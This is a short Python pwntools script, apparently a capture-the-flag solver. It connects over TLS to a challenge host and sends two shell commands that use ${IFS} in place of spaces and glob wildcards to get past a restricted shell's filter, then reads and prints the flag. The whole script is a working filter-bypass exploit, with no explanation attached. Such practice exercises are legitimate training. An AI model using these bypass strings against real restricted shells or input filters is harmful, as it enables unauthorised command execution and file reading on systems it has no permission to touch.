#!/usr/bin/env python3

from pwn import *

r = remote(
    args.HOST or "66b5f6dd-2fc4-4d7a-a684-57a80e634779.play-dev.gaslightctf.cooking",
    31337,
    ssl=True,
)

r.sendlineafter(b"$ ", b"cd${IFS}*e")
r.sendlineafter(b"$ ", b"cat${IFS}*")

r.recvline()
flag = r.recvline(drop=True)
log.success(f"{flag=}")
